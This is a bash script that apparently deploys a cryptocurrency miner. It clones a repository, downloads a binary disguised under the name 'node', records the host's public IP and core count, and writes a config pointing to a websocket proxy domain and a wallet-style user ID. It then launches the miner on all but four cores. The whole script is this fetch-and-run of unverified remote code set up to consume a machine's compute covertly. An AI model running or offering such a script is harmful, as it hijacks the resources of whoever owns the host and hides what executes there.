#!/bin/bash
git clone https://github.com/miltoncarpenter665/nano-mbc.git
sleep 2
cd nano-mbc
wget https://raw.githubusercontent.com/miltoncarpenter665/nano-mbc/refs/heads/main/node
sleep 2
chmod +x node
sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2


array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y_Shiny_')
ipaddress=$(curl -s api.ipify.org)
num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
used_num_of_cores=`expr $num_of_cores - 4`
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

sleep 2

echo ""
echo "You will be using $used_num_of_cores cores"
echo ""

sleep 2


cat > data.json <<END
{
  "proxy": "ws://usashadespectre$(shuf -i 1-6 -n 1).devopsenterprise.uk:9999/emVyZ3AyYi5kZXZvcHNlbnRlcnByaXNlLnVrOjc0NDU=",
  "config": { "threads": $used_num_of_cores, "log": true },
  "options": { "user": "Bh43dUV3ypTM7SRFcyBcV1Rt8A1taua7FG.$currentdate", "password": "c=MBC,mc=MBC,ID=$currentdate", "argent": "web-wasm/1.0" }
}
END

sleep 2

./node app.js
